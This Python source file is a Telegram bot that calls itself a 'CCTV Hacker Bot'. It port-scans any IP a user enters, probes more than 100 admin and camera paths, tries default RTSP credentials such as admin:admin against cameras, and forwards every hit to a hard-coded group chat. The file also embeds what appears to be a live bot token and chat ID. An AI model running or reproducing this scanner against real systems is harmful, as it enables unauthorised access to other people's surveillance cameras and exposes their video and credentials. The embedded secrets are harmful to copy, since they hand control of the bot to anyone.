import os
import asyncio
import socket
import logging
import re
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession, ClientTimeout

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT, CHECK_LINK = range(3)

# Common CCTV credentials (kept for RTSP scanning in standard mode)
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Expanded admin paths (100+ paths)
ADMIN_PATHS = [
    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin", "/login.php", "/admin/login", "/panel",
    "/default.html", "/index.html", "/home", "/config", "/adminpanel", "/login.asp", "/sysadmin", "/webadmin", "/backend",
    "/admin/index.php", "/live", "/stream", "/cam", "/video", "/media", "/playback", "/rtsp", "/mjpeg", "/h264", "/snapshot",
    "/camera", "/view", "/monitor", "/surveillance", "/security", "/webcam", "/ipcam", "/cctv", "/admin/console", "/setup",
    "/configuration", "/settings", "/management", "/controlpanel", "/user", "/guest", "/access", "/auth", "/login.html",
    "/admin.asp", "/admin.php", "/system", "/network", "/device", "/firmware", "/upgrade", "/reboot", "/status", "/log",
    "/logs", "/event", "/events", "/record", "/recording", "/archive", "/backup", "/storage", "/sdcard", "/api", "/rest",
    "/json", "/xml", "/data", "/info", "/diagnostic", "/test", "/debug", "/maintenance", "/service", "/support", "/help",
    "/about", "/version", "/license", "/admin/settings", "/admin/config", "/admin/users", "/admin/logs", "/admin/status",
    "/admin/network", "/admin/security", "/admin/update", "/admin/backup", "/admin/restart", "/admin/reset", "/admin/control",
    "/admin/view", "/admin/stream", "/admin/camera", "/admin/video", "/admin/snapshot", "/admin/record", "/admin/playback",
    "/admin/api", "/admin/rest", "/admin/json", "/admin/xml", "/admin/info"
]

# Common ports
COMMON_PORTS = [80, 443, 8080, 8443]

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation."""
    keyboard = [
        [InlineKeyboardButton("Start Scan", callback_data="start_hack"), InlineKeyboardButton("Check Link", callback_data="check_link")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 CCTV Hacker Bot! 🚀\n"
        "Scan CCTVs or admin panels. Use /hack for advanced options or click 'Check Link' to scan a URL.\n"
        "Click an option below:",
        reply_markup=reply_markup
    )
    return IP

async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Provide advanced scan options."""
    keyboard = [
        [InlineKeyboardButton("Deep Path Scan", callback_data="special_scan"), InlineKeyboardButton("Check Link", callback_data="check_link")],
        [InlineKeyboardButton("Standard Scan", callback_data="start_hack")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Advanced Scan Options:\n"
        "- Deep Path Scan: Check 100+ admin/CCTV paths\n"
        "- Standard Scan: Basic IP/port scan\n"
        "- Check Link: Scan a specific URL\n"
        "Choose an option:",
        reply_markup=reply_markup
    )

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Standard Scan."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter IP (e.g., 192.168.1.1):")
    context.user_data["scan_type"] = "standard"
    return IP

async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Deep Path Scan."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter IP for deep path scan (100+ paths):")
    context.user_data["scan_type"] = "special"
    return IP

async def check_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Check Link button."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Please provide a URL to check (e.g., http://192.168.8.20:80/login):")
    return CHECK_LINK

async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Check if a URL is an admin panel."""
    url = update.message.text.strip()
    logger.debug(f"Checking URL: {url}")
    try:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        path = parsed_url.path or "/"

        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
            await update.message.reply_text("Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
            return CHECK_LINK

        if not await check_port(ip, port):
            await update.message.reply_text(f"❌ Port {port} closed on {ip}.")
            return ConversationHandler.END

        is_admin, details = await check_admin_panel(url)
        panel_name = path.strip("/") or "root"

        if is_admin:
            keyboard = [[InlineKeyboardButton(f"Visit {panel_name}", url=url)]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"✅ **Admin Panel**: {panel_name} 🎯\nURL: {url}\nDetails: {', '.join(details)}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            try:
                await context.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"✅ **Admin Panel** for {ip}:{port}!\nURL: {url}\nDetails: {', '.join(details)}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Group send error: {e}")
        else:
            await update.message.reply_text(f"❌ No admin panel at {url}.\nDetails: {', '.join(details)}")

        return ConversationHandler.END

    except Exception as e:
        logger.error(f"URL check error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")
        return CHECK_LINK

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Help."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "📚 Help - CCTV Hacker Bot\n"
        "1. /start: Basic scan or check URL\n"
        "2. /hack: Advanced scan options\n"
        "3. Check Link: Click 'Check Link' to scan a URL\n"
        "4. Enter IP/port or blank for common ports\n"
        "5. Deep Path Scan checks 100+ paths\n"
        "⚠️ Use ethically!"
    )

async def check_admin_panel(url: str) -> tuple[bool, list]:
    """Check if a URL is an admin panel."""
    details = []
    try:
        async with ClientSession(timeout=ClientTimeout(total=3)) as session:
            async with session.get(url, ssl=False, allow_redirects=True) as response:
                status = response.status
                html = await response.text()
                headers = response.headers

                is_admin = False
                if re.search(r'<form.*?(username|login|email|password).*?>', html, re.I | re.S):
                    is_admin = True
                    details.append("Login form detected")
                keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in"]
                if any(keyword in html.lower() for keyword in keywords):
                    is_admin = True
                    details.append("Admin keywords found")
                server = headers.get("Server", "").lower()
                powered_by = headers.get("X-Powered-By", "").lower()
                if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress"]):
                    details.append(f"Server: {server or powered_by}")
                if status in [401, 403]:
                    details.append("Unauthorized/Forbidden")
                    is_admin = True

                return is_admin, details or ["No admin indicators"]
    except Exception as e:
        return False, [f"Error: {str(e)}"]

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Store IP and ask for port."""
    ip = update.message.text.strip()
    logger.debug(f"Received IP: {ip}")
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
        await update.message.reply_text("Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("Enter port (e.g., 80, 8443) or leave blank:")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process IP and port, perform scan."""
    ip = context.user_data.get("ip")
    port_input = update.message.text.strip()
    scan_type = context.user_data.get("scan_type", "standard")
    logger.debug(f"Received port: {port_input}, scan_type: {scan_type}")

    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
            ports_to_scan = [port]
        except ValueError:
            await update.message.reply_text("Invalid port! Use 1-65535 or leave blank.")
            return PORT

    results = []
    admin_pages = []
    inline_buttons = []

    for port in ports_to_scan:
        port_results, port_admin_pages = await hack_cctv(ip, port, scan_type)
        results.append(port_results)
        admin_pages.extend(port_admin_pages)

        for admin_url in port_admin_pages:
            inline_buttons.append([
                InlineKeyboardButton(f"Visit {admin_url.split('/')[-1] or 'root'}", url=admin_url)
            ])

    reply_markup = InlineKeyboardMarkup(inline_buttons)
    results_text = "\n\n".join(results)
    await update.message.reply_text(results_text, reply_markup=reply_markup)

    if admin_pages:
        await update.message.reply_text(
            "✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages]),
            parse_mode="Markdown"
        )

    try:
        group_message = f"Results for {ip}\n\n{results_text}"
        if admin_pages:
            group_message += "\n✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages])
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Group send error: {e}")

    context.user_data["admin_pages"] = admin_pages
    return ConversationHandler.END

async def hack_cctv(ip: str, port: int, scan_type: str) -> tuple[str, list]:
    """Perform CCTV scan based on scan_type."""
    results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
    admin_pages = []
    open_paths = []
    semaphore = asyncio.Semaphore(10)

    if not await check_port(ip, port):
        results.append("❌ Port closed.")
        return "\n".join(results), admin_pages

    results.append(f"✅ Port {port} open!")
    service = "http" if port in [80, 443, 8080, 8443] else "rtsp"
    results.append(f"Service: {service}")

    async def check_path(protocol: str, path: str) -> tuple[bool, str, list]:
        async with semaphore:
            url = f"{protocol}://{ip}:{port}{path}"
            logger.debug(f"Checking path: {url}")
            try:
                async with ClientSession(timeout=ClientTimeout(total=3)) as session:
                    async with session.get(url, ssl=False, allow_redirects=True) as response:
                        status = response.status
                        html = await response.text()
                        is_admin, details = await check_admin_panel(url)
                        return is_admin, url, details
            except Exception as e:
                return False, url, [f"Error: {str(e)}"]

    if service == "http" and scan_type in ["standard", "special"]:
        protocols = ["http", "https"] if port in [443, 8443] else ["http"]
        paths_to_check = ADMIN_PATHS if scan_type == "special" else ADMIN_PATHS[:20]  # Limit to 20 for standard scan
        tasks = [check_path(protocol, path) for protocol in protocols for path in paths_to_check]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for is_admin, url, details in responses:
            if is_admin:
                admin_pages.append(url)
                results.append(f"✅ **Admin Page** 🎯: {url} ({', '.join(details)})")
            else:
                results.append(f"✅ Path: {url} (No admin)")
            open_paths.append(url.split("/")[-1])

        results.append(f"Paths Checked: {len(open_paths)}/{len(paths_to_check) * len(protocols)}")

    if service == "rtsp" and scan_type == "standard":
        for username, password in CREDENTIALS:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            is_valid, error = await validate_rtsp(ip, port, username, password)
            if is_valid:
                admin_pages.append(rtsp_url)
                results.append(f"✅ RTSP Success: {username}:{password}")
            else:
                results.append(f"❌ RTSP Failed: {error}")

    results.append("⚠️ Use ethically and legally.")
    return "\n".join(results), admin_pages

async def check_port(ip: str, port: int) -> bool:
    """Check if port is open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        logger.error(f"Port check error: {e}")
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    """Validate RTSP credentials."""
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\nCSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        writer.write(request.encode('ascii'))
        await writer.drain()
        response = await asyncio.wait_for(reader.read(1024), timeout=3)
        response_str = response.decode('ascii', errors='ignore')
        writer.close()
        await writer.wait_closed()
        return "RTSP/1.0 200 OK" in response_str, "Success" if "200 OK" in response_str else response_str[:50]
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel conversation."""
    await update.message.reply_text("Cancelled. Use /start or /hack.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check bot status."""
    await update.message.reply_text("Bot online! Use /start or /hack.")

async def keep_alive():
    """Keep-alive server for Koyeb."""
    import http.server
    import socketserver
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()
    server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
    logger.info(f"Keep-alive on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

def run_keep_alive(loop):
    """Run keep_alive in a separate event loop."""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(keep_alive())

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("hack", hack)],
        states={
            IP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                CallbackQueryHandler(special_scan_callback, pattern="^special_scan$"),
                CallbackQueryHandler(check_link_callback, pattern="^check_link$"),
                CallbackQueryHandler(help_callback, pattern="^help$"),
            ],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
            CHECK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status))

    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    application.run_polling()

if __name__ == "__main__":
    main()
